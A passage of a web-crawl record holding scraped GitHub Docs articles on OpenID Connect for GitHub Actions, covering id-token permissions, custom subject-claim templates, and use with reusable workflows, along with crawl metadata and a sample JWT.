`bound_subject=\"repo:octo-org/octo-repo:ref:refs/heads/demo-branch\"` |\n\nFor more information, see the guides listed in [Enabling OpenID Connect for your cloud provider](#enabling-openid-connect-for-your-cloud-provider).\n\n## [Updating your actions for OIDC](#updating-your-actions-for-oidc)\n\nTo update your custom actions to authenticate using OIDC, you can use `getIDToken()` from the Actions toolkit to request a JWT from GitHub's OIDC provider. For more information, see \"OIDC Token\" in the [npm package documentation](https://www.npmjs.com/package/@actions/core/v/1.6.0).\n\nYou could also use a `curl` command to request the JWT, using the following environment variables.\n\n| Variable | Description |\n| --- | --- |\n| `ACTIONS_ID_TOKEN_REQUEST_URL` | The URL for GitHub's OIDC provider. |\n| `ACTIONS_ID_TOKEN_REQUEST_TOKEN` | Bearer token for the request to the OIDC provider. |\n\nFor example:\n\nShell\n\n```\ncurl -H \"Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange\"\n```\n\n### [Adding permissions settings](#adding-permissions-settings)\n\nThe job or workflow run requires a `permissions` setting with [`id-token: write`](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token) to allow GitHub's OIDC provider to create a JSON Web Token for every run. You won't be able to request the OIDC JWT ID token if the `permissions` for `id-token` is not set to `write`, however this value doesn't imply granting write access to any resources, only being able to fetch and set the OIDC token for an action or step to enable authenticating with a short-lived access token. Any actual trust setting is defined using OIDC claims, for more information see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#configuring-the-oidc-trust-with-the-cloud).\n\nThe `id-token: write` setting allows the JWT to be requested from GitHub's OIDC provider using one of these approaches:\n\n*   Using environment variables on the runner (`ACTIONS_ID_TOKEN_REQUEST_URL` and `ACTIONS_ID_TOKEN_REQUEST_TOKEN`).\n*   Using `getIDToken()` from the Actions toolkit.\n\nIf you need to fetch an OIDC token for a workflow, then the permission can be set at the workflow level. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n  contents: read  # This is required for actions/checkout\n```\n\nIf you only need to fetch an OIDC token for a single job, then this permission can be set within that job. For example:\n\nYAML\n\n```\npermissions:\n  id-token: write # This is required for requesting the JWT\n```\n\nYou may need to specify additional permissions here, depending on your workflow's requirements.\n\nFor reusable workflows that are owned by the same user, organization, or enterprise as the caller workflow, the OIDC token generated in the reusable workflow can be accessed from the caller's context. For reusable workflows outside your enterprise or organization, the `permissions` setting for `id-token` should be explicitly set to `write` at the caller workflow level or in the specific job that calls the reusable workflow. This ensures that the OIDC token generated in the reusable workflow is only allowed to be consumed in the caller workflows when intended.\n\nFor more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n## [Customizing the token claims](#customizing-the-token-claims)\n\nYou can security harden your OIDC configuration by customizing the claims that are included with the JWT. These customizations allow you to define more granular trust conditions on your cloud roles when allowing your workflows to access resources hosted in the cloud:\n\n*   You can customize values for `audience` claims. See [Customizing the `audience` value](#customizing-the-audience-value).\n*   You can customize the format of your OIDC configuration by setting conditions on the subject (`sub`) claim that require JWT tokens to originate from a specific repository, reusable workflow, or other source.\n*   You can define granular OIDC policies by using additional OIDC token claims, such as `repository_id` and `repository_visibility`. See [Understanding the OIDC token](#understanding-the-oidc-token).\n\n### [Customizing the `audience` value](#customizing-the-audience-value)\n\nWhen you use custom actions in your workflows, those actions may use the GitHub Actions Toolkit to enable you to supply a custom value for the `audience` claim. Some cloud providers also use this in their official login actions to enforce a default value for the `audience` claim. For example, the [GitHub Action for Azure Login](https://github.com/Azure/login/blob/master/action.yml) provides a default `aud` value of `api://AzureADTokenExchange`, or it allows you to set a custom `aud` value in your workflows. For more information on the GitHub Actions Toolkit, see the [OIDC token](https://github.com/actions/toolkit/tree/main/packages/core#oidc-token) section in the documentation.\n\nIf you do not want to use the default `aud` value offered by an action, you can provide a custom value for the `audience` claim. This allows you to set a condition that only workflows in a specific repository or organization can access the cloud role. If the action you are using supports this, you can use the `with` keyword in your workflow to pass a custom `aud` value to the action. For more information, see [Metadata syntax for GitHub Actions](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#inputs).\n\n### [Customizing the subject claims for an organization or repository](#customizing-the-subject-claims-for-an-organization-or-repository)\n\nTo help improve security, compliance, and standardization, you can customize the standard claims to suit your required access conditions. If your cloud provider supports conditions on subject claims, you can create a condition that checks whether the `sub` value matches the path of the reusable workflow, such as `\"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\"`. The exact format will vary depending on your cloud provider's OIDC configuration. To configure the matching condition on GitHub, you can use the REST API to require that the `sub` claim must always include a specific custom claim, such as `job_workflow_ref`. You can use the REST API to apply a customization template for the OIDC subject claim; for example, you can require that the `sub` claim within the OIDC token must always include a specific custom claim, such as `job_workflow_ref`. For more information, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc).\n\nNote\n\nWhen the organization template is applied, it will not affect any workflows already using OIDC unless their repository has opted in to custom organization templates. For all repositories, existing and new, the repository owner will need to use the repository-level REST API to opt in to receive this configuration by setting `use_default` to `false`. Alternatively, the repository owner could use the REST API to apply a different configuration specific to the repository. For more information, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\nCustomizing the claims results in a new format for the entire `sub` claim, which replaces the default predefined `sub` format in the token described in [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#example-subject-claims).\n\nNote\n\nThe `sub` claim uses the shortened form `repo` (for example, `repo:ORG-NAME/REPO-NAME`) instead of `repository` to reference the repository. Any `:` within the context value will be replaced with `%3A`.\n\nThe following example templates demonstrate various ways to customize the subject claim. To configure these settings on GitHub, admins use the REST API to specify a list of claims that must be included in the subject (`sub`) claim.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\nTo customize your subject claims, you should first create a matching condition in your cloud provider's OIDC configuration, before customizing the configuration using the REST API. Once the configuration is completed, each time a new job runs, the OIDC token generated during that job will follow the new customization template. If the matching condition doesn't exist in the cloud provider's OIDC configuration before the job runs, the generated token might not be accepted by the cloud provider, since the cloud conditions may not be synchronized.\n\n#### [Example: Allowing repository based on visibility and owner](#example-allowing-repository-based-on-visibility-and-owner)\n\nThis example template allows the `sub` claim to have a new format, using `repository_owner` and `repository_visibility`:\n\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner\",\n       \"repository_visibility\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include specific values for `repository_owner` and `repository_visibility`. For example: `\"sub\": \"repository_owner:monalisa:repository_visibility:private\"`. The approach lets you restrict cloud role access to only private repositories within an organization or enterprise.\n\n#### [Example: Allowing access to all repositories with a specific owner](#example-allowing-access-to-all-repositories-with-a-specific-owner)\n\nThis example template enables the `sub` claim to have a new format with only the value of `repository_owner`.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner\"\n   ]\n}\n\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include a specific value for `repository_owner`. For example: `\"sub\": \"repository_owner:monalisa\"`\n\n#### [Example: Requiring a reusable workflow](#example-requiring-a-reusable-workflow)\n\nThis example template allows the `sub` claim to have a new format that contains the value of the `job_workflow_ref` claim. This enables an enterprise to use [reusable workflows](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#example-subject-claims) to enforce consistent deployments across its organizations and repositories.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n  {\n     \"include_claim_keys\": [\n         \"job_workflow_ref\"\n     ]\n  }\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include a specific value for `job_workflow_ref`. For example: `\"sub\": \"job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\"`.\n\n#### [Example: Requiring a reusable workflow and other claims](#example-requiring-a-reusable-workflow-and-other-claims)\n\nThe following example template combines the requirement of a specific reusable workflow with additional claims.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\nThis example also demonstrates how to use `\"context\"` to define your conditions. This is the part that follows the repository in the [default `sub` format](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#example-subject-claims). For example, when the job references an environment, the context contains: `environment:ENVIRONMENT-NAME`.\n\n```\n{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\",\n       \"job_workflow_ref\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include specific values for `repo`, `context`, and `job_workflow_ref`.\n\nThis customization template requires that the `sub` uses the following format: `repo:ORG-NAME/REPO-NAME:environment:ENVIRONMENT-NAME:job_workflow_ref:REUSABLE-WORKFLOW-PATH`. For example: `\"sub\": \"repo:octo-org/octo-repo:environment:prod:job_workflow_ref:octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\"`\n\n#### [Example: Granting access to a specific repository](#example-granting-access-to-a-specific-repository)\n\nThis example template lets you grant cloud access to all the workflows in a specific repository, across all branches/tags and environments.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n{\n   \"include_claim_keys\": [\n       \"repo\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require a `repo` claim that matches the required value.\n\n#### [Example: Using system-generated GUIDs](#example-using-system-generated-guids)\n\nThis example template enables predictable OIDC claims with system-generated GUIDs that do not change between renames of entities (such as renaming a repository).\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n  {\n     \"include_claim_keys\": [\n         \"repository_id\"\n     ]\n  }\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require a `repository_id` claim that matches the required value.\n\nor:\n\n```\n{\n   \"include_claim_keys\": [\n       \"repository_owner_id\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require a `repository_owner_id` claim that matches the required value.\n\n#### [Example: Context value with `:`](#example-context-value-with-)\n\nThis example demonstrates how to handle context value with `:`. For example, when the job references an environment named `production:eastus`.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n{\n   \"include_claim_keys\": [\n       \"environment\",\n       \"repository_owner\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include a specific value for `environment` and `repository_owner`. For example: `\"sub\": \"environment:production%3Aeastus:repository_owner:octo-org\"`.\n\n#### [Resetting organization template customizations](#resetting-organization-template-customizations)\n\nThis example template resets the subject claims to the default format. This template effectively opts out of any organization-level customization policy.\n\nTo apply this configuration, submit a request to the API endpoint and include the required configuration in the request body. For organizations, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-an-organization), and for repositories, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\"\n   ]\n}\n```\n\nIn your cloud provider's OIDC configuration, configure the `sub` condition to require that claims must include specific values for `repo` and `context`.\n\n#### [Resetting repository template customizations](#resetting-repository-template-customizations)\n\nAll repositories in an organization have the ability to opt in or opt out of (organization and repository-level) customized `sub` claim templates.\n\nTo opt out a repository and reset back to the default `sub` claim format, a repository administrator must use the REST API endpoint at [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\nTo configure repositories to use the default `sub` claim format, use the `PUT /repos/{owner}/{repo}/actions/oidc/customization/sub` REST API endpoint at with the following request body.\n\n```\n{\n   \"use_default\": true\n}\n```\n\n#### [Example: Configuring a repository to use an organization template](#example-configuring-a-repository-to-use-an-organization-template)\n\nOnce an organization has created a customized `sub` claim template, the REST API can be used to programmatically apply the template to repositories within the organization. A repository administrator can configure their repository to use the template created by the administrator of their organization.\n\nTo configure the repository to use the organization's template, a repository admin must use the `PUT /repos/{owner}/{repo}/actions/oidc/customization/sub` REST API endpoint at with the following request body. For more information, see [REST API endpoints for GitHub Actions OIDC](https://docs.github.com/en/rest/actions/oidc#set-the-customization-template-for-an-oidc-subject-claim-for-a-repository).\n\n```\n{\n   \"use_default\": false\n}\n```\n\n## [Updating your workflows for OIDC](#updating-your-workflows-for-oidc)\n\nYou can now update your YAML workflows to use OIDC access tokens instead of secrets. Popular cloud providers have published their official login actions that make it easy for you to get started with OIDC. For more information about updating your workflows, see the cloud-specific guides listed below in [Enabling OpenID Connect for your cloud provider](#enabling-openid-connect-for-your-cloud-provider).\n\n## [Enabling OpenID Connect for Python package publishing](#enabling-openid-connect-for-python-package-publishing)\n\nYou can use a GitHub Actions workflow in a repository as a trusted publisher for a PyPI project. Using a workflow as a trusted publisher allows OIDC access tokens to be exchanged for temporary PyPI API tokens. For more information, see [Configuring OpenID Connect in PyPI](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-pypi) and [Publishing to PyPI with a Trusted Publisher](https://docs.pypi.org/trusted-publishers/) in the PyPI documentation.\n\n## [Enabling OpenID Connect for your cloud provider](#enabling-openid-connect-for-your-cloud-provider)\n\nTo enable and configure OIDC for your specific cloud provider, see the following guides:\n\n*   [Configuring OpenID Connect in Amazon Web Services](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)\n*   [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-azure)\n*   [Configuring OpenID Connect in Google Cloud Platform](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform)\n*   [Configuring OpenID Connect in HashiCorp Vault](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault)\n\nTo enable and configure OIDC for another cloud provider, see the following guide:\n\n*   [Configuring OpenID Connect in cloud providers](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers)\n\n## [Debugging your OIDC claims](#debugging-your-oidc-claims)\n\nYou can use the [`github/actions-oidc-debugger`](https://github.com/github/actions-oidc-debugger) action to visualize the claims that would be sent, before integrating with a cloud provider. This action requests a JWT and prints the claims included within the JWT that were received from GitHub Actions.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 320,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-origin",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-remove",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-extrac",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-readab",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-about-security-hardening-with-openid-connect-readab"
    },
    "lengths": {
      "extractus": 54438,
      "readableText": 48836,
      "none": 76230,
      "readableTextIfPossible": 48836,
      "result": 48836,
      "markdown": 38676
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows",
    "loadedTime": "2025-05-08T06:37:16.224Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows",
    "title": "Using OpenID Connect with reusable workflows - GitHub Docs",
    "description": "You can use reusable workflows with OIDC to standardize and security harden your deployment steps.",
    "author": null,
    "keywords": "Workflows,Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using OpenID Connect with reusable workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "FE9F:2C6BB9:1ABE:24A7:681C5110",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:04 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686225.526178, VS0, VE326",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27236",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using OpenID Connect with reusable workflows\nYou can use reusable workflows with OIDC to standardize and security harden your deployment steps.\nAbout reusable workflows\nRather than copying and pasting deployment jobs from one workflow to another, you can create a reusable workflow that performs the deployment steps. A reusable workflow can be used by another workflow if it meets one of the access requirements described in Reusing workflows.\nYou should be familiar with the concepts described in Reusing workflows and About security hardening with OpenID Connect.\nDefining the trust conditions\nWhen combined with OpenID Connect (OIDC), reusable workflows let you enforce consistent deployments across your repository, organization, or enterprise. You can do this by defining trust conditions on cloud roles based on reusable workflows. The available options will vary depending on your cloud provider:\nUsing job_workflow_ref:\nTo create trust conditions based on reusable workflows, your cloud provider must support custom claims for job_workflow_ref. This allows your cloud provider to identify which repository the job originally came from.\nFor clouds that only support the standard claims (audience (aud) and subject (sub)), you can use the API to customize the sub claim to include job_workflow_ref. For more information, see About security hardening with OpenID Connect. Support for custom claims is currently available for Google Cloud Platform and HashiCorp Vault.\nCustomizing the token claims:\nYou can configure more granular trust conditions by customizing the subject (sub) claim that's included with the JWT. For more information, see About security hardening with OpenID Connect.\nHow the token works with reusable workflows\nDuring a workflow run, GitHub's OIDC provider presents a OIDC token to the cloud provider which contains information about the job. If that job is part of a reusable workflow, the token will include the standard claims that contain information about the calling workflow, and will also include a custom claim called job_workflow_ref that contains information about the called workflow.\nFor example, the following OIDC token is for a job that was part of a called workflow. The workflow, ref, and other attributes describe the caller workflow, while job_workflow_ref refers to the called workflow:\nYAML\n{ \"typ\": \"JWT\", \"alg\": \"RS256\", \"x5t\": \"example-thumbprint\", \"kid\": \"example-key-id\" } { \"jti\": \"example-id\", \"sub\": \"repo:octo-org/octo-repo:environment:prod\", \"aud\": \"https://github.com/octo-org\", \"ref\": \"refs/heads/main\", \"sha\": \"example-sha\", \"repository\": \"octo-org/octo-repo\", \"repository_owner\": \"octo-org\", \"actor_id\": \"12\", \"repository_id\": \"74\", \"repository_owner_id\": \"65\", \"run_id\": \"example-run-id\", \"run_number\": \"10\", \"run_attempt\": \"2\", \"actor\": \"octocat\", \"workflow\": \"example-workflow\", \"head_ref\": \"\", \"base_ref\": \"\", \"event_name\": \"workflow_dispatch\", \"ref_type\": \"branch\", \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\", \"iss\": \"https://token.actions.githubusercontent.com\", \"nbf\": 1632492967, \"exp\": 1632493867, \"iat\": 1632493567 } \nIf your reusable workflow performs deployment steps, then it will typically need access to a specific cloud role, and you might want to allow any repository in your organization to call that reusable workflow. To permit this, you'll create the trust condition that allows any repository and any caller workflow, and then filter on the organization and the called workflow. See the next section for some examples.\nExamples\nFiltering for reusable workflows within a specific repository\nYou can configure a custom claim that filters for any reusable workflow in a specific repository. In this example, the workflow run must have originated from a job defined in a reusable workflow in the octo-org/octo-automation repository, and in any repository that is owned by the octo-org organization.\nSubject:\nSyntax: repo:ORG_NAME/*\nExample: repo:octo-org/*\nCustom claim:\nSyntax: job_workflow_ref:ORG_NAME/REPO_NAME\nExample: job_workflow_ref:octo-org/octo-automation@*\nFiltering for a specific reusable workflow at a specific ref\nYou can configure a custom claim that filters for a specific reusable workflow. In this example, the workflow run must have originated from a job defined in the reusable workflow octo-org/octo-automation/.github/workflows/deployment.yml, and in any repository that is owned by the octo-org organization.\nSubject:\nSyntax: repo:ORG_NAME/*\nExample: repo:octo-org/*\nCustom claim:\nSyntax: job_workflow_ref:ORG_NAME/REPO_NAME/.github/workflows/WORKFLOW_FILE@ref\nExample: job_workflow_ref:octo-org/octo-automation/.github/workflows/deployment.yml@ 10040c56a8c0253d69db7c1f26a0d227275512e2",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-using-openid-connect-with-reusable-workflows-f6fp6.html",
  "markdown": "# Using OpenID Connect with reusable workflows\n\nYou can use reusable workflows with OIDC to standardize and security harden your deployment steps.\n\n## [About reusable workflows](#about-reusable-workflows)\n\nRather than copying and pasting deployment jobs from one workflow to another, you can create a reusable workflow that performs the deployment steps. A reusable workflow can be used by another workflow if it meets one of the access requirements described in [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows#access-to-reusable-workflows).\n\nYou should be familiar with the concepts described in [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows) and [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).\n\n## [Defining the trust conditions](#defining-the-trust-conditions)\n\nWhen combined with OpenID Connect (OIDC), reusable workflows let you enforce consistent deployments across your repository, organization, or enterprise. You can do this by defining trust conditions on cloud roles based on reusable workflows. The available options will vary depending on your cloud provider:\n\n*   **Using `job_workflow_ref`:**\n    \n    *   To create trust conditions based on reusable workflows, your cloud provider must support custom claims for `job_workflow_ref`. This allows your cloud provider to identify which repository the job originally came from.\n    *   For clouds that only support the standard claims (audience (`aud`) and subject (`sub`)), you can use the API to customize the `sub` claim to include `job_workflow_ref`. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#customizing-the-token-claims). Support for custom claims is currently available for Google Cloud Platform and HashiCorp Vault.\n*   **Customizing the token claims:**\n    \n    *   You can configure more granular trust conditions by customizing the subject (`sub`) claim that's included with the JWT. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#customizing-the-token-claims).\n\n## [How the token works with reusable workflows](#how-the-token-works-with-reusable-workflows)\n\nDuring a workflow run, GitHub's OIDC provider presents a OIDC token to the cloud provider which contains information about the job. If that job is part of a reusable workflow, the token will include the standard claims that contain information about the calling workflow, and will also include a custom claim called `job_workflow_ref` that contains information about the called workflow.\n\nFor example, the following OIDC token is for a job that was part of a called workflow. The `workflow`, `ref`, and other attributes describe the caller workflow, while `job_workflow_ref` refers to the called workflow:\n\nYAML\n\n```\n{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"example-thumbprint\",\n  \"kid\": \"example-key-id\"\n}\n{\n  \"jti\": \"example-id\",\n  \"sub\": \"repo:octo-org/octo-repo:environment:prod\",\n  \"aud\": \"https://github.com/octo-org\",\n  \"ref\": \"refs/heads/main\",\n  \"sha\": \"example-sha\",\n  \"repository\": \"octo-org/octo-repo\",\n  \"repository_owner\": \"octo-org\",\n  \"actor_id\": \"12\",\n  \"repository_id\": \"74\",\n  \"repository_owner_id\": \"65\",\n  \"run_id\": \"example-run-id\",\n  \"run_number\": \"10\",\n  \"run_attempt\": \"2\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"example-workflow\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"workflow_dispatch\",\n  \"ref_type\": \"branch\",\n  \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\",\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567\n}\n```\n\nIf your reusable workflow performs deployment steps, then it will typically need access to a specific cloud role, and you might want to allow any repository in your organization to call that reusable workflow. To permit this, you'll create the trust condition that allows any repository and any caller workflow, and then filter on the organization and the called workflow. See the next section for some examples.\n\n## [Examples](#examples)\n\n**Filtering for reusable workflows within a specific repository**\n\nYou can configure a custom claim that filters for any reusable workflow in a specific repository. In this example, the workflow run must have originated from a job defined in a reusable workflow in the `octo-org/octo-automation` repository, and in any repository that is owned by the `octo-org` organization.\n\n*   **Subject:**\n    \n    *   Syntax: `repo:ORG_NAME/*`\n    *   Example: `repo:octo-org/*`\n*   **Custom claim:**\n    \n    *   Syntax: `job_workflow_ref:ORG_NAME/REPO_NAME`\n    *   Example: `job_workflow_ref:octo-org/octo-automation@*`\n\n**Filtering for a specific reusable workflow at a specific ref**\n\nYou can configure a custom claim that filters for a specific reusable workflow. In this example, the workflow run must have originated from a job defined in the reusable workflow `octo-org/octo-automation/.github/workflows/deployment.yml`, and in any repository that is owned by the `octo-org` organization.\n\n*   **Subject:**\n    \n    *   Syntax: 